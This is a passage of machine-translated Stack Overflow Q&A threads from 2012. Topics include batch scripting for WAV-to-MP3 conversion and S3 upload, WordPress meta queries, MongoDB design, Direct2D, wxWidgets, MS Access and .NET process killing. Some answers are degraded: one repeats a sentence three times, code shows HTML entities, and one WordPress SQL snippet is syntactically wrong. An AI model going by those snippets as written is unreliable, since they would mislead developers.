\R::transaction( function() use ( $oOpenStatBean ){ R::store( $oOpenStatBean ); } ); 
```

该事务将导致“FOR UPDATE”子句锁定找到的行，或者在没有找到行的情况下锁定新行将进入的索引中的位置，这样您就不会遇到并发问题。

现在这不会解决一个用户更新记录的问题，但这是一个完全不同的话题。

# mongodb - 对 NoSQL 设计的困惑

> ID：13429306
> 
> 赞同：5
> 
> 时间：2012-11-17T09:25:26.130
> 
> 标签：mongodb, visualization, nosql

我知道 NoSQL 不是关系数据库，因此我无法绘制 ERD 或其他只能应用于关系数据库的方法。

我的困惑是：我应该说明什么样的方法或图表来设计 NoSQL 数据库？

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-17T09:42:56.270

这是最近 10gen 事件演示的摘要，表明思维导图是这项工作最合乎逻辑的工具。我希望出现更专业的工具，但总的来说，思维导图与非关系模式设计非常吻合。

它的强大之处在于它的简单性，就像 MongoDB 一样。使用思维导图开源工具，可以创建“点击”的动态 MongoDB 模式的清晰且充满活力的可视化。此外，它的工作方式相反——思维导图可用于在 MongoDB 中创建动态模式。思维导图流程允许非技术业务用户在动态中直观地开发他们的需求。在设计过程中，思维导图提供了一种灵活的可视化工具，可以流畅地变化。” 思维导图流程允许非技术业务用户在动态中直观地开发他们的需求。在设计过程中，思维导图提供了一种灵活的可视化工具，可以流畅地变化。” 思维导图流程允许非技术业务用户在动态中直观地开发他们的需求。在设计过程中，思维导图提供了一种灵活的可视化工具，可以流畅地变化。”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T11:24:55.827

您可以相当轻松地使用标准工具，但这取决于您的特定场景和您要解决的问题。实际上，我最近对此进行了一次对话：[https](https://groups.google.com/forum/?fromgroups=#!topic/mongodb-user/xZCwEm06eU4) ://groups.google.com/forum/?fromgroups=#!topic/mongodb-user/xZCwEm06eU4这可能会有所帮助，但是该对话也非常专业。

从那以后我一直在想，与其重复我自己，不如写一本用于绘制 MongoDB 风格的 UML 图的手册。

也许如果您解释您对想要绘制的 UML 图的看法，那么我们可以就如何完成它们的一种 NoSQL 表示提供更详细的答案。

# batch-file - 通过遍历子目录自动将 WAV 文件转换为 MP3 的批处理脚本

> ID：13429309
> 
> 赞同：1
> 
> 时间：2012-11-17T09:26:04.317
> 
> 标签：batch-file, traversal, directory

## 编辑 1

步骤 1：电话对话以 .WAV 格式记录在特定文件夹和子文件夹中（由录音软件以当前日期格式**自动创建，即****20121119 (YYYYMMDD)**。此命名约定不能更改。当前日期子文件夹会自动创建在**D**盘中名为**RECFILED**的文件夹中。比如说，如果是今天的录音，则文件将存储在**20121119**子文件夹中。昨天的文件存储在**20121118**中。

第 2 步：最后，这些 *.WAV 文件需要转换为 *.MP3 格式并上传到 Amazon S3。目前这个过程是手动的。由于 WAV 文件很多，所以我使用 SOX 将 WAV 批量转换为 MP3。为此，我创建了一个批处理文件（在我的原始问题中进行了解释），以便可以自动化此转换过程。此批处理文件将 WAV 转换为 MP3，并将 MP3 文件保存在与 WAV 文件相同的文件夹中。为此，我要做的就是复制文件夹中的批处理文件并运行它。它转换文件并将其保存在同一文件夹中。

第 3 步：文件转换完成后。然后在 Amazon S3 上的特定存储桶中，我必须创建一个具有当前日期的新文件夹，以便可以将所有这些 MP3 存储在那里。**但是，这里的日期格式是 DD.MM.YYYY**。文件夹层次结构是**\BucketName\Voice\201211\19.11.2012\*.MP3（今天）**、**\BucketName\Voice\201211\20.11.2012\*.MP3（明天）**等等。

现在，问题是：

1.  遍历最新的文件夹（查看 d:\RecFileD\YYYYMMDD）并查看文件夹中是否有可用的 WAV 文件。如果是，则将这些文件转换为 MP3 并将它们存储在本地服务器上任何特定位置的名为 DD.MM.YYYY 的文件夹中。（今天的日期，但格式不同）。

2.  一次，创建文件夹（使用 DD.MM.YYYY 命名约定。相同的文件夹需要在特定月份（即 201211）上传到 S3。一旦月份发生变化，比如 12 月，与 12 月相关的文件将进入文件夹 201212 等等。

3.  这里的问题是，在本地服务器上，命名约定是 YYYYMMDD（不带空格、点或逗号），而在 S3 上，命名约定是 DD.MM.YYYY（带点）。

## 原始问题

请帮我编写一个批处理文件，以便我可以自动化将 WAV 文件转换为 MP3 的过程，然后将它们直接上传到 Amazon S3 到特定文件夹。现在它是一个手动过程。

实际上，我们正在运行一个小型呼叫中心，所有语音呼叫都记录并保存在服务器上的`D:`驱动器中的文件夹`RecFileD`中，并以当前日期命名的子文件夹（即，`20121117`等等`20121116`）。默认情况下，文件以 WAV 格式保存。在将文件上传到 Amazon S3 进行存储之前，我需要将文件转换为 MP3。

要求是我需要每天在一天结束的特定时间在 S3 上上传 MP3 文件。问题是如何遍历到最后一个文件夹（当前日期文件夹）并转换文件。在本地服务器上，语音文件保存在`d:\RecFileD\20121117\*.wav`Amazon S3 上，文件上传到文件夹中：

*   `\BucketName\Voice\201211\17.11.2012\*.mp3`（这是十一月）；

*   `\bucketName\Voice\201212\01.12.2012\*.mp3`（这将是 12 月）（全天 31 个文件夹）。

为了自动转换，我创建了以下批处理文件。此文件使用 SOX 应用程序将 WAV 文件转换为当前文件夹中的 MP3。

```
@echo off
call :treeprocess
goto :eof

:treeprocess
for %%f in (*.wav) do 
(
  sox %%~nf.WAV %%~nf.mp3
  sox %%~nf.WAV %%~nf-short.mp3 trim 0:30 1:00
)

for /D %%d in (*) do 
(
  cd %%d
  call :treeprocess
  cd ..
)
exit /b 
```

为了自动将文件上传到 S3，我将使用 S3 命令行工具。

简而言之，需要以下步骤：

1.  仅遍历本地服务器上的当前日期文件夹（`20121115`、、`20121116`等`20121117`）并将 WAV 文件转换为 MP3（使用上述脚本）。

2.  `17.11.2012`将这些 MP3 文件移动到自动命名为（根据当前日期）创建的单独文件夹。

3.  将文件夹上传到特定位置的 Amazon S3。即，`\bucketname\voice\201211\17.11.2012`。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T20:50:40.603

你所拥有的非常好，你已经很接近了。

我正在测试的环境需要`do (`将 open paren 与 do 放在同一行。中间有换行符的格式可能会导致问题。

您完全缺少的是对预期为 YYYYMMDD 的目录名称的任何解析。你可以这样做：

```
set dirname=%%d

set year=%dirname:~0,4%
set month=%dirname:~4,2%
set day=%dirname:~6,2% 
```

完成此操作后，很容易根据 YYYY、MM、DD 创建文件名和路径：

```
set s3path=!file_year!!file_month!\!file_day!.!file_month!.!file_year! 
```

将生成类似 YYYYMM\DD.MM.YYYY 的路径。

您可以使用以下方法获取“最后一个”目录：

```
for /f "tokens=1" %%a IN ('dir /b /a:d /o:n ????????') do (
  set dirset=%%a
) 
```

注意：这仅在第二种解决方案中实现。让我们分解一下：

```
dir /b /a:d /o:n ???????? 
```

是否以“裸”格式创建目录（仅匹配文件列表，每行一个），具有属性目录（仅列出目录），按名称排序（这是 NTFS 的默认设置，但不是 FAT，因此最好指定排序顺序)，匹配 ??????????，任意 8 个字符（因为目录应该命名为 YYYYMMDD，所以总是 8 个字符）。这将返回 8 个字符的目录名称的有序列表。

```
for /f "tokens=1" %%a IN ('command') do echo %%a 
```

`command`逐行执行并解析结果。这里将回显每个结果的第一个标记。

```
for /f "tokens=1" %%a IN ('dir /b /a:d /o:n ????????') do (
  set dirset=%%a
) 
```

我们将它们放在一起，看看`dirset`将设置为每个匹配的目录名称。但是在`for`循环完成后，它将被设置为*最后一个*值，或“最新”目录。

在下面的代码中我已经`dirname`单独设置以避免变量扩展规则的问题。或者，您应该能够使用：

```
setlocal enableextensions enabledelayedexpansion 

set dirname=%%d
set year=!dirname:~0,4! 
```

如前所述，您的问题不需要递归。我的代码只是迭代每个目录，然后迭代每个文件。如果文件布局的结构不如您指出的那样，则可能需要递归。

您没有指定您使用哪个 Windows S3 命令行工具，所以我`*S3COPY*`使用本地完整路径和部分路径进行回应。您应该可以用您的复制命令替换它。

您需要从中运行它，`d:\RecFileD`或者您可以在 bat 文件顶部附近添加它：

```
d:
cd \RecFileD 
```

您可能需要更改`s3root`为本地 S3 副本的实际根目录。我没有移动文件，而是让 sox 在正确的位置创建它们。

我设置了年、月、日变量，`processfiles`因为变量扩展规则使设置它们`processdirs`变得复杂。

如果您做的远不止这些，我建议您研究 Python。它有一个很棒的社区/生态系统，很容易上手并且是免费的。另外，您不会把所有的时间都花在与语言打架上。

这是我的第一次尝试：

```
@echo off

setlocal

set s3root=d:\s3\bucket\voice

call :processdirs
goto :eof

:processfiles
  set year=%dirname:~0,4%
  set month=%dirname:~4,2%
  set day=%dirname:~6,2%

  set s3path=%year%%month%\%day%.%month%.%year%
  set s3dir=%s3root%\%s3path%
  if not exist "%s3dir%" md "%s3dir%"

  for %%f in (*.wav) do (
    sox "%%~nf.WAV" "%s3dir%\%%~nf.mp3"
    sox "%%~nf.WAV" "%s3dir%\%%~nf-short.mp3" trim 0:30 1:00
  )

  echo *S3COPY* %s3dir% %s3path%
  goto :eof

:processdirs
  for /D %%d in (*) do (
    set dirname=%%d
    cd "%%d"
    call :processfiles
    cd ..
  )
  goto :eof 
```

@Aacini 的回答让我意识到，不幸的是我的解决方案缺乏。它不仅仅处理今天的文件。但我很关心跳过一天会发生什么。

我添加了两个参数来控制处理的内容。第一个参数指定一个命名过滤器，可以是以下之一：

*   **newlatest** - 最新目录中的新文件，基于文件名（默认）
*   **latest** - 最新目录中的所有文件，基于文件名
*   **today** - 今天的目录
*   **newdirs** - S3 树中不存在的所有目录（缺失日期）
*   **newfiles** - S3 树中不存在的所有文件
*   **all** - 所有文件（用于覆盖 S3 树中的损坏）

如果过滤器是`newdirs`,`newfiles`或`all`，则可以使用第二个参数来进一步过滤目录名称。您可以使用 * 和 ? 通配符匹配一组文件。

如果您将脚本保存为 ProcDirs.bat，那么这里有一些示例：

`ProcDirs all 20121119`
将强制处理（或重新处理）指定目录。

`ProcDirs newdirs 201211??`
将处理与目录名称匹配的新目录（从输出树中丢失）（指定年份和月份的任何一天）。

`ProcDirs newfiles 2012????`
将处理与目录名称匹配的目录中的新文件（从输出树中丢失）（指定年份的任何一天）。

`ProcDirs`
`ProcDirs newlatest`
完全相同，因为`newlatest`是默认值。这将处理（词法上）“最新”目录中的新文件

代码比较复杂，但还*不错*。我确实尝试使用@Aacini 的代码来获取今天的月/日/年，但它在我的系统上不起作用（因为我的日期格式必须与要求的不同）。所以我使用了一种不依赖于本地日期格式的不同方法。

我的第一个解决方案不需要延迟扩展，但是这个解决方案需要使用`setlocal`（适用于 Win XP 但可能不适用于较旧的 Windows）并使用`!`而不是`%`用于环境变量替换。

```
@echo off

setlocal enableextensions enabledelayedexpansion

set s3root=d:\s3\bucket\voice

rem Set the default filter mode

set newfilter=none
set dirsetfilter=none

set arg=%1
if "!arg!" == "" set arg=newlatest

if "!arg!" == "newdirs" (
  set newfilter=newdirs
) else if "!arg!" == "newfiles" (
  set newfilter=newfiles
) else if "!arg!" == "all" (
  set dirsetfilter=none
  set newfilter=none
) else if "!arg!" == "today" (
  set dirsetfilter=today
) else if "!arg!" == "latest" (
  set dirsetfilter=latest
) else if "!arg!" == "newlatest" (
  set newfilter=newfiles
  set dirsetfilter=latest
)

if !dirsetfilter! == today (
  for /f "skip=1 tokens=1-3" %%a IN ('wmic path Win32_LocalTime Get Day^,Month^,Year /Format:table') do (
    if %%a GTR 0 (
      set now_day=%%a
      set now_month=%%b
      set now_year=%%c
    )
  )
  set dirset=!now_year!!now_month!!now_day!
  if not "%2" == "" echo Second parameter, dirset, ignored when filter is today
) else if !dirsetfilter! == latest (
  rem pull out the name of the 'last' directory
  for /f "tokens=1" %%a IN ('dir /b /a:d /o:n ????????') do (
    set dirset=%%a
  )
  if not "%2" == "" echo Second parameter, dirset, ignored when filter is latest
) else if not "%2" == "" (
  rem The second parameter is dirset. Wild card chars, *? allowed
  rem only matched dir(s) processed
  set dirset=%2
) else (
  rem process all dirs that match filter
  set dirset=*
)

call :processdirs
goto :eof

:processfiles
  set file_year=!dirname:~0,4!
  set file_month=!dirname:~4,2!
  set file_day=!dirname:~6,2!

  set s3path=!file_year!!file_month!\!file_day!.!file_month!.!file_year!
  set s3dir=!s3root!\!s3path!

  set skipdir=FALSE
  if not exist "!s3dir!" (
    md "!s3dir!"
  ) else (
    if newdirs == !newfilter! set skipdir=TRUE
  )

  if !skipdir! == FALSE (
    set havenewfiles=FALSE

    for %%f in (*.wav) do (
      set skipfile=FALSE
      if newfiles==!newfilter! if exist "!s3dir!\%%~nf.mp3" set skipfile=TRUE
      if !skipfile! == FALSE (
        set havenewfiles=TRUE
        echo sox "%%~nf.WAV" "!s3dir!\%%~nf.mp3"
        sox "%%~nf.WAV" "!s3dir!\%%~nf.mp3"
      )

      set skipfile=FALSE
      if newfiles == !newfilter! if exist "!s3dir!\%%~nf-short.mp3" set skipfile=TRUE
      if !skipfile! == FALSE (
        set havenewfiles=TRUE
        echo sox "%%~nf.WAV" "!s3dir!\%%~nf-short.mp3" trim 0:30 1:00
        sox "%%~nf.WAV" "!s3dir!\%%~nf-short.mp3" trim 0:30 1:00
      )
    )

    if !havenewfiles! == TRUE (
      echo *S3COPY* !s3dir! !s3path!
    )
  )
  goto :eof

:processdirs
  for /D %%d in (!dirset!) do (
    echo Process Dir: %%d
    set dirname=%%d
    cd "%%d"
    call :processfiles
    cd ..
  )
  goto :eof 
```

祝你好运。我希望这有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T22:17:14.733

哇！这听起来比实际复杂得多！

```
@echo off
rem Create folder names from current date, MM/DD/YYYY locale format is assumed
for /F "tokens=1-3 delims=/" %%a in ("%date%") do (
   set YYYYMMDD=%%c%%a%%b
   set YYYYMM=%%c%%a
   set DD.MM.YYYY=%%b.%%a.%%c
)
rem Enter into target folder
cd /D D:\RecFileD\%YYYYMMDD%
rem Convert WAV files to MP3 using SOX
for %%f in (*.wav) do (
   sox %%~nf.WAV %%~nf.mp3
   sox %%~nf.WAV %%~nf-short.mp3 trim 0:30 1:00
)
rem Move MP3 files to brother folder
md ..\%DD.MM.YYYY%
move *.mp3 ..\%DD.MM.YYYY%
rem Upload the folder to Amazon S3
echo S3COPY from ..\%DD.MM.YYYY% to \bucketname\voice\%YYYYMM%\%DD.MM.YYYY% 
```

我建议您在描述问题时尽可能简洁，但不要忘记任何细节。例如，在您的（长）描述中，命名的本地文件夹`17.11.2012`还不够解释！

我希望这是你想要的...

安东尼奥

# wordpress - 使用 wordpress 帖子的酒店价格比较逻辑

> ID：13429311
> 
> 赞同：1
> 
> 时间：2012-11-17T09:26:15.840
> 
> 标签：wordpress, comparison, logic

考虑一种情况，我发布了元字段：

1.  最低价格
2.  Max_Price

所以每个帖子都有这两个字段，值可以是从非零到 1000 的任何整数。

举个例子：

1.  发布#1 min_price = 5; 最大价格 = 100
2.  发布#2 min_price = 50; 最大价格 = 150

我想制作自定义订单逻辑以与 query_posts 一起使用。因此，用户可以选择价格范围并查看具有选定值的帖子。

现在，如果我只有 1 个价格和 1 个字段，那么让用户选择价格范围并获取属于这些范围的帖子会很容易，如下所示：

```
query_posts( array(
    'post_type' =&gt; 'product',
    'meta_query' =&gt; array(
        array(
            'key' =&gt; 'price',
            'value' =&gt; array( 100, 200 ),
            'compare' =&gt; 'BETWEEN',
            'type' =&gt; 'numeric',
        )
    )
) ); 
```

因此，在这里可以看到价格在 100-200 之间的每个帖子。

但我有一系列价值观......我认为这会奏效：

```
query_posts( array(
    'post_type' =&gt; 'product',
    'meta_query' =&gt; array(
        array(
            'key' =&gt; 'min_price',
            'value' =&gt; array( 100, 200 ),
            'compare' =&gt; 'BETWEEN',
            'type' =&gt; 'numeric',
        ),
            array(
            'key' =&gt; 'max_price',
            'value' =&gt; array( 100, 200 ),
            'compare' =&gt; 'BETWEEN',
            'type' =&gt; 'numeric',
        )
    )
) ); 
```

这里客户选择的范围 100<->200 帖子 #1 和帖子 #2 的值都在此范围内，因此访问者会对它们都感兴趣。不幸的是，我的查询逻辑将它们排除在外。

我的大脑现在不能很好地工作，所以我错过了一些简单的东西。有什么提示吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:42:33.503

我现在知道你的方法应该可行，除了 McNab 可能是正确的（这里有很多例子：http: [//codex.wordpress.org/Class_Reference/WP_Query#Custom_Field_Parameters](http://codex.wordpress.org/Class_Reference/WP_Query#Custom_Field_Parameters)）但我会让我的旧答案保留。有人可能会发现它对非标准的东西很有用。

我不知道您是否可以使用查询发布参数来执行此操作，但我在源代码中查找了它，查询看起来是这样的：

```
SELECT $found_rows $distinct $fields 
FROM $wpdb->posts $join 
WHERE 1=1 $where 
$groupby 
$orderby 
$limits 
```

这些是与相关查询变量对应的过滤器：

```
$where = apply_filters_ref_array('posts_where', array( $where, &$this ) );
$join = apply_filters_ref_array('posts_join', array( $join, &$this ) ); 
```

所以这意味着问题可以简化为 SQL：

```
function postmeta_join( $join )
{
    $join .= "
    LEFT JOIN $wpdb->postmeta AS max_price ON max_price.meta_key = 'max_price'
    LEFT JOIN $wpdb->postmeta AS min_price ON min_price.meta_key = 'min_price'";
    return $join;
}

function filter_prices($where)
{
    $where .= " AND max_price.max_price BETWEEN 100, 200 AND min_price.min_price BETWEN 100, 200";
    return $where;
}

add_filter( 'posts_where', 'filter_prices' );
add_filter( 'posts_join', 'postmeta_join' ); 
```

现在我不是 SQL 专家，所以这可能存在问题。但如果你没有得到任何其他答案，你可以玩这个。（顺便说一句，您可能想在完成过滤器后删除它们。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T11:54:38.880

您所做的应该可以工作，但是您错过了“关系”参数。它应该是;

```
 'meta_query' => array(
                    'relation' => 'AND',
                    array(
                        'key' =&gt; 'min_price',
                        'value' =&gt; array( 100, 200 ),
                        'compare' =&gt; 'BETWEEN',
                        'type' =&gt; 'numeric',
                    ),
                        array(
                        'key' =&gt; 'max_price',
                        'value' =&gt; array( 100, 200 ),
                        'compare' =&gt; 'BETWEEN',
                        'type' =&gt; 'numeric',
                    )
                ) 
```

另一件要注意的是，在第一个实例中，meta_id 是“price”，而在第二个实例中，您使用的是“min_price”和“max_price”。这些确定是设置好的吗？

我之所以提到这一点，是因为最近我很难处理这些带有多个子数组的元查询以及用户在表单中提交值的 AND 关系（就像我对您的问题的理解一样）。存在一个问题，即在数组中的项目存在空值的情况下，查询不起作用。这意味着由 scribu 修复；

[http://core.trac.wordpress.org/ticket/18158](http://core.trac.wordpress.org/ticket/18158)

但我根本无法让它发挥作用。扯掉我的头发。我最终检查了提交的值以查看是否有一个，然后单独创建数组。如果 $min_array 或 $max_array 为 NULL，则查询将起作用，但如果 meta_values 中的任何一个为 NULL 并且它是按照您的方式构建的，则查询将不起作用。我希望这是有道理的，我的代码如下；

```
 if ($min_price) {
                  $min_array = array('key' => 'min_price','value' => $min_price, 'value' => '=', 'type' => 'numeric');
                }

                if ($max_price) {
                  $max_array = array('key' => 'max_price','value' => $max_price, 'value' => '=', 'type' => 'numeric');
                }

                'meta_query' => array(
                    'relation' => 'AND',
                    $min_array,
                    $max_array
                ) 
```

# adb - Eclipse 找不到安卓手机

> ID：13429313
> 
> 赞同：0
> 
> 时间：2012-11-17T09:26:30.263
> 
> 标签：adb, android

我最近将我的android版本从2.2.3升级到2.3.5（HTC Desire HD），现在eclipse找不到它，我之前没有问题。我以前没有问题。USB调试已启用，我的连接类型仅充电（也尝试过磁盘驱动器）。重新启动计算机没有任何作用，重新启动eclipse也没有。我也做过很多次恢复出厂设置。我在Windows 7上。

任何想法/知道问题是什么？

谢谢。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-11-17T09:52:38.327

由“Samir Mangroliya”提供的回答：

--> 在您的电脑上下载并安装 HTC Sync。

下载 HTC Sync 将必要的驱动程序安装到我的电脑上。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-17T10:19:23.627

在启动 Eclipse 之前将手机连接到计算机。

# jquery - 投资组合项目重新排列

> ID：13429315
> 
> 赞同：1
> 
> 时间：2012-11-17T09:26:40.027
> 
> 标签：jquery, css

我想在第一行移动具有活动类别的投资组合项目。此时，不活动的类别只是隐藏起来。

```
var Portfolio = {
sort: function(items) {
    items.show();
    $('#portfolio-content').find('div.portfolio-item').not(items).slideUp(500);
},
showAll: function(items) {
    items.fadeIn(500);
},
doSort: function() {
    $('a', '#portfolio-sort').on('click', function() {

        var $a = $(this);
        if (!$a.is('#all')) {

            var items = $('div[data-cat=' + $a.data('cat') + ']', '#portfolio-content');

            Portfolio.sort(items);

        } else {

            Portfolio.showAll($('div.portfolio-item', '#portfolio-content'));

        }

    });
}
};

Portfolio.doSort();​ 
```

我希望他们在具有活动类别的项目之后移动。你可以在这里看到一个例子 [http://codecanyon.net/item/the-wall-media-gallery-jquery-powered/full_screen_preview/223915](http://codecanyon.net/item/the-wall-media-gallery-jquery-powered/full_screen_preview/223915)

# gpu - ID2D1DCRenderTarget 与 ID2D1HwndRenderTarget

> ID：13429320
> 
> 赞同：1
> 
> 时间：2012-11-17T09:28:11.770
> 
> 标签：gpu, gdi, direct2d, rendertarget

我正在尝试将一些 GDI/GDI+ 代码移植到 Direct2D，但对于哪种类型的目标更适合使用（DC 或 Hwnd）我仍然有点困惑，因为我发现不同的性能取决于我是否使用了显卡。特别是，我发现了以下问题：

如果我使用 DCRenderTarget 我不能使用硬件加速（或默认），因为我继续违反内存的保护区。如果我使用 HwndRenderTarget，这不会发生。

如果我使用 HwndRenderTarget，通常一切都很好，但如果我有很多窗口（如按钮），我会失去对主窗口的关注，它无法识别 KeyPressed 消息，并且，如果我使用 Gpu，性能下降很多并且强烈依赖于活动目标的数量（如果我使用软件加速则不会发生）。

有没有人遇到过同样的问题？你能推荐一些关于它的东西吗？

非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T11:38:56.067

一般来说，如果你想让 Direct2D 与 GDI 互操作，你应该使用 ID2D1DCRenderTarget，否则，使用 ID2D1HwndRenderTarget。

我不太明白你所说的性能，你的意思是当你的主窗口失去焦点时性能很差？如果是这种情况，您可以处理窗口状态，使其在窗口失去焦点时停止渲染，例如不活动。

# windows - 使用 Codlite 编译的 Wxwidgets 项目在 Windows 上请求 dll

> ID：13429322
> 
> 赞同：0
> 
> 时间：2012-11-17T09:28:28.890
> 
> 标签：windows, cross-platform, wxwidgets, codelite

我正在尝试使用 WxWidegts 构建一个多平台桌面应用程序。作为 IDE，我正在使用 Codlite。版本信息是

Codlite：修订版 5770 WxWidgets：2.9.4 操作系统：Windows 7 编译器：g++

问题是，编译后，尝试启动程序会给出一个错误，告诉我 wxbase294u_gcc_cl.dll 丢失。我想也许它是一个调试库的东西，所以我将构建配置设置为发布，但仍然是同样的错误。

我的理解是 Wxwidgets 原生构建到操作系统，因此它不应该依赖于这么大的 dll。该 dll 存在于 Codlite 安装的库中，但系统似乎没有拾取它。

我应该使用 VC++ 构建吗？不知道如何在构建设置上进行设置。

我长期以来一直是 WebApp 人，并且是跨平台开发的新手，所以如果我走错了路，请帮助我。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T12:15:32.380

wxWidgets 库代码必须链接到您的应用程序代码。这可以通过两种方式完成：A) 使用静态库，它在构建时链接到您的应用程序可执行文件，或 B) 使用 DLL，它们在运行时链接到您的应用程序。

根据您的问题，您已经构建了使用 DLLS 的应用程序。

您有两种选择来解决此问题。最简单的方法是将所需的 DLL 复制到您的应用程序文件夹中。

您还可以更改 codelite 选项以使用 wxWidgets 静态库 - 您需要 codelite 专家来帮助您做到这一点。

我快速浏览了 codelite 网页。默认情况下，codelite 看起来确实使用 wxWidgets DLL。要改变这一点，您需要按照[此处描述](http://codelite.org/WxWidgets/GettingReadyForWxWidgetsDevelopmentUnderWindows)的“DIY”方式构建 wxWidgets，但将 SHARED make 选项设置为 0

# database - 在 MS Access 表单中自定义导航按钮栏

> ID：13429323
> 
> 赞同：0
> 
> 时间：2012-11-17T09:28:30.683
> 
> 标签：database, ms-access, customization, vba, ms-access-2010

我正在 MS Access 中创建一个表单。我的表单以模式弹出框的形式出现在用户面前。在表单的底部，我们得到导航按钮、新条目（我已禁用）、过滤器和搜索选项。

我想自定义这个导航按钮栏。例如，我不希望“记录”字样出现在该栏的最左侧位置。

![导航栏](../Images/419ab7873b482a03953562febfd5ae92.png)

我一直在寻找方法来做同样的事情。我不确定是否可以实现相同的目标，但仍然充满希望。

感谢期待。

周杰伦

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T09:42:50.280

您可以在表单属性中禁用导航按钮，这意味着该栏不会出现，并且在 Access 2007 和 2010 中，您可以设置导航标题，这意味着您可以拥有一些东西而不是“记录”，但您不能自定义栏本身。

如果您必须有自定义导航，请禁用该栏并添加您自己的导航选项。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T09:56:57.673

据我所知，您可以将*记录更改为其他内容，但不能自定义导航栏的其他部分。*

![表单属性](../Images/9e36e6847db7de5894337d6068c65251.png)

将显示为：

![自定义导航栏](../Images/616325d4ea069c1048fa4659a397044a.png)

如果您想走得更远，您可以拦截 Windows 消息并即时更改措辞，但这会很复杂，而且肯定需要做很多工作。

另一方面，您可以简单地不显示导航栏，而是使用按钮和一些 VBA 创建自己的导航。

# .net - 无法杀死进程.net

> ID：13429324
> 
> 赞同：0
> 
> 时间：2012-11-17T09:28:46.800
> 
> 标签：.net, process, cmd

我似乎用以下代码创建了一个“不朽”的过程：

```
System.Diagnostics.ProcessStartInfo test = new ProcessStartInfo("cmd", " /c " + aCommandLine); //aCommandLine is : ruby test.rb
test.CreateNoWindow = true;
test.RedirectStandardError = true;
test.RedirectStandardOutput = true;
test.UseShellExecute = false;
test.WorkingDirectory = System.IO.Path.GetDirectoryName(aRTextFilePath);
System.Diagnostics.Process aProcess = Process.Start(test);
aProcess.EnableRaisingEvents = true;
aProcess.Exited += new EventHandler(aProcess_Exited);
try
{
    //read synchronously to get the port number
    string aPortInformationLine = aProcess.StandardOutput.ReadLine();
    if (!aProcess.HasExited)
    {
        aProcess.Kill();
        Debug.Print("Process Has Exited");
    }
    //return true;
    errorOut = String.Format("Could not start process with command line : {0} from .rtext file {1}", aCommandLine, aRTextFilePath);
    port = -1;
    return false;
}
catch (Win32Exception ex)
{
    Debug.WriteLine(ex.NativeErrorCode.ToString());
    errorOut = String.Format("Could not start process with command line : {0} from .rtext file {1}. Error : {2}", aCommandLine, aRTextFilePath, ex.NativeErrorCode.ToString());
}
catch (Exception ex)
{
    Debug.WriteLine(ex.Message);
    errorOut = String.Format("Could not start process with command line : {0} from .rtext file {1}. Error : {2}", aCommandLine, aRTextFilePath, ex.Message);
} 
```

所以我使用 cmd 来启动某种红宝石服务器。该过程开始，我能够从新创建的过程中读取输出。但是，当执行 kill 命令时，不会抛出异常，但 ruby​​ 进程不会死亡。

这与使用 cmd 有什么关系吗？我做错了什么吗？谢谢

**编辑：**

我使用进程资源管理器并在杀死前后拍了两张照片：

前：

![杀前](../Images/227d215be276ce5c19099172d38823cb.png) 后：

![杀戮之后](../Images/0ef202cc3910ba3c6929d15b1b4aacb5.png)

因此，当 cmd.exe 死亡时，ruby 以某种方式设法继续并活着看到另一天..

**编辑2：**

回答我的问题：[在 C# 中以编程方式杀死进程树](https://stackoverflow.com/questions/5901679/kill-process-tree-programatically-in-c-sharp)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T14:19:00.953

您希望杀死命令处理器也会杀死任何由它启动的进程，这是一个空闲进程，Windows 就是不能那样工作。Windows 中有一种机制，工作对象，但你不想去那里。根本不要使用 cmd.exe，它不会增加任何价值。直接启动ruby.exe。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T11:42:07.130

来自 MSDN：

Kill 方法异步执行。调用Kill方法后，调用WaitForExit方法等待进程退出，或者查看HasExited属性判断进程是否退出。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-17T12:14:46.487

请检查进程是否有任何未声明为后台线程的线程。而且那个过程可能有任何无限循环..

# android - Camera.translate 和 Matrix.preTranslate 或 Matrix.postTranslate 之间的区别？

> ID：13429328
> 
> 赞同：6
> 
> 时间：2012-11-17T09:29:38.343
> 
> 标签：android, camera, android-canvas, translate

我们使用[Camera](http://developer.android.com/reference/android/graphics/Camera.html)在canvas中做3D变换。我们通常旋转camera得到它的Matrix然后平移它。但是Camera也有[translate](http://developer.android.com/reference/android/graphics/Camera.html#translate%28float,%20float,%20float%29)方法。使用方法的结果是不同的。

我的问题是：***Camera.translate 和 Matrix.preTranslate 或 Matrix.postTranslate 有什么区别？***

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-17T21:13:06.247

两者兼有的原因是，矩阵乘法必须按特定顺序进行才能获得正确的结果（您可能已经知道）。

平移/旋转/缩放的顺序在您键入时以**相反的顺序完成。**

因此，如果您执行以下操作：

```
Camera.rotate(15, 0, 0);
Camera.scale(.5f, .5f, .5f);
Camera.translate(70, 70, 70); 
```

您首先平移 70、70、70，然后在所有方向上缩放 50%，然后绕 X 轴旋转 15 度。

所以 Matrix 有一个前后翻译（嗯，前后翻译），因为也许你想先将它实际旋转 15 度，然后平移它，然后最后缩放它。

这样就可以回答前后翻译。现在，Camera 具有直接旋转和平移功能的原因是那些已经知道它是如何工作的人（比如我！），所以我从不使用 Matrix 或 Camera，因为我可以直接在 Canvas 上简单地进行旋转和平移。你也可以，只要你知道平移、缩放和旋转是以相反的顺序完成的。

